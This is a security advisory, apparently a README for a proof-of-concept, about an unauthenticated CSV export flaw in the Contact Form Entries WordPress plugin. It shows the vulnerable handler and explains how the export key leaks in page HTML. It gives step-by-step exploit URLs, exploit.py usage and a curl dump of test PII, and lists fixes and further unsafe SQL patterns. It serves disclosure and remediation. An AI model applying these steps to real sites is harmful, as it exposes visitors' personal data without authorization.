CVE-2025-XXXXX: Unauthenticated Data Export in Contact Form Entries <= 1.5.0
==============================================================================

Plugin:    Database for Contact Form 7, WPforms, Elementor forms
Slug:      contact-form-entries
Vendor:    WPFactory / CRM Perks
Versions:  All versions through 1.5.0 (latest at time of writing)
Installs:  70,000+
CVSS:      ~8.6 (High/Critical)
Type:      Unauthenticated Information Disclosure
CWE:       CWE-862 (Missing Authorization)

An unauthenticated attacker can export all stored form submissions (names,
emails, phone numbers, messages, and any other PII collected via forms) by
requesting a single URL with a static key that is leaked in the page source.

No login, no cookies, no nonce, no interaction required.


Discovery Context
-----------------
Found during review of the CVE-2025-7384 patch (PHP Object Injection via
maybe_unserialize in verify_val()). That fix in v1.4.4 was incomplete --
bare maybe_unserialize() calls remain in download_csv() and entry duplication
code. While investigating those residual deserialization issues, we identified
this more severe unauthenticated data export vulnerability.


Affected Endpoint
-----------------
The plugin registers a CSV export handler on WordPress's "init" hook, which
fires on every page load before any authentication layer:

  File: contact-form-entries.php, init() method (~line 76)

  if(!empty($_GET['vx_crm_form_action']) && $_GET['vx_crm_form_action'] == 'download_csv'){
    $key=$this->post('vx_crm_key');
    $form_ids=get_option('vx_crm_forms_ids');
    if(is_array($form_ids)){
      $form_id=array_search($key,$form_ids);
      if(!empty($form_id)){
          vxcf_form::set_form_fields($form_id);
          self::download_csv($form_id,array('vx_links'=>'false','user_id'=>get_current_user_id()));
          die();
      }
    }
  }

There is:
  - No is_admin() check
  - No current_user_can() check
  - No wp_verify_nonce() / check_ajax_referer()
  - No rate limiting

The only gate is a static secret key stored in the wp_options table under
"vx_crm_forms_ids".


How the Key Leaks
-----------------
When a site uses the [vx-entries] shortcode with the export="true" attribute
(a premium feature), the plugin generates a random key and stores it in the
database. This key is then rendered directly in the page HTML as a download
link:

  File: templates/leads-table.php (~line 10)

  <a class="vx_export_btn"
     href="?vx_crm_form_action=download_csv&vx_crm_key=<?php echo esc_html($export) ?>">

Any visitor -- authenticated or not -- who can view the page sees the key in
the HTML source. The key is static; it never rotates.


Exploitation
------------
Step 1: Find a page with the entries shortcode. View source, search for
        "vx_crm_key". Copy the key value.

Step 2: Request:
        https://target.com/?vx_crm_form_action=download_csv&vx_crm_key=<KEY>

Step 3: Receive a CSV file containing ALL form submissions for that form,
        including every field value (names, emails, phone numbers, messages,
        and any other data collected).

Or use the provided PoC:

  python3 exploit.py --url https://target.com --key <KEY>
  python3 exploit.py --url https://target.com --page /entries/ --extract-key
  python3 exploit.py --url https://target.com --key <KEY> -o dump.csv


Verification
------------
Tested and confirmed on a local Docker environment:

  Plugin:    Contact Form Entries v1.5.0 (latest)
  WordPress: 6.7.2
  PHP:       8.2.28
  CF7:       6.1.5

Test output (redacted):

  $ curl 'http://localhost:8099/?vx_crm_form_action=download_csv&vx_crm_key=testkey_...'

  HTTP/1.1 200 OK
  Content-disposition: attachment; filename=2026-04-05.csv
  Content-Type: application/download

  #,"Your Name","Your Email","Your Subject","Your Message",System,Source,Screen,Updated,Created
  1,"John Secret",john.secret@megacorp.com,"Confidential Inquiry","My SSN is 999-88-7777",...
  2,"Test User",secret@company.com,Confidential,"SSN: 123-45-6789 sensitive PII data",...


Prerequisites
-------------
The target site must:
  1. Have the Contact Form Entries plugin installed and active (any version <= 1.5.0)
  2. Have the premium addon active (required for the export feature)
  3. Use the [vx-entries export="true"] shortcode on at least one page
  4. Have at least one form submission stored

The premium addon requirement limits the attack surface compared to the free
version's 70k installs, but sites using the premium tier are typically
higher-value targets (businesses collecting customer data via forms).


Root Cause Analysis
-------------------
The vulnerability is a textbook CWE-862: Missing Authorization. The
download_csv endpoint was designed for the frontend shortcode's export button
but was implemented on the global "init" hook without any WordPress capability
check. The developer used a static secret key as a substitute for
authentication -- a pattern known as "security through obscurity" -- and then
leaked that secret in the page HTML.

The fix is straightforward:
  - Add current_user_can('manage_options') or an appropriate capability check
  - Add wp_verify_nonce() validation
  - Or at minimum: do not render the key in public-facing HTML


Relationship to CVE-2025-7384
-----------------------------
CVE-2025-7384 was a PHP Object Injection in the verify_val() function that
allowed unauthenticated RCE. The fix in v1.4.4 commented out the dangerous
maybe_unserialize() call in verify_val().

However, the download_csv() function at line ~3024 originally had a bare
maybe_unserialize() call on the same stored data:

  v1.4.3-1.4.4:  $val = maybe_unserialize($row[$field['name'].'_field']);
  v1.5.0:        $val = vxcf_form::maybe_unserialize($row[$field['name'].'_field']);

In v1.5.0, this was changed to use the guarded wrapper. BUT the wrapper is
called WITHOUT the required $lead parameter:

  vxcf_form::maybe_unserialize($row[$field['name'].'_field']);
                                                              ^-- no $lead!

The wrapper defaults $lead=array(), so $old_lead=false, and deserialization
is always skipped. This is safe by accident, not by design.

Additional bare maybe_unserialize() calls remain in v1.5.0:
  - Line ~1212: entry duplication flow (authenticated)
  - Line ~338:  dead code block (unreachable)
  - Lines ~2246/2260/2549: form config deserialization (not user-controlled)


Additional Findings: SQL Injection Patterns
-------------------------------------------
During the code review, several SQL injection patterns were identified in
includes/data.php that use string concatenation instead of $wpdb->prepare():

  lead_actions():  Raw concatenation of $key and $val into UPDATE statement
  delete_leads():  $ids=implode(',',$leads) without prepare()
  get_entries():   $_GET['orderby'] flows into ORDER BY via ltrim() only
  get_entries():   Search field name flows into column position via trim()

These require admin authentication and are partially mitigated by
sanitize_text_field() and (int) casts, but the patterns are fundamentally
unsafe and may be exploitable via second-order injection or future code
changes that relax the input handling.


Files
-----
  exploit.py     PoC script for unauthenticated CSV export
  README.txt     This file


Timeline
--------
  2025-03-19  CVE-2025-7384 reported by Nguyen Xuan Chien
  2025-04-16  CVE-2025-7384 published
  2025-08-04  v1.4.4 released (partial fix for CVE-2025-7384)
  2025-??-??  v1.5.0 released
  2026-04-05  This vulnerability identified during patch review
  2026-04-05  Verified on v1.5.0 in isolated Docker environment


Disclaimer
----------
This research was conducted in an isolated local environment for defensive
security purposes. The PoC is provided for authorized security testing and
responsible disclosure only. Do not use against systems you do not own or
have explicit authorization to test.
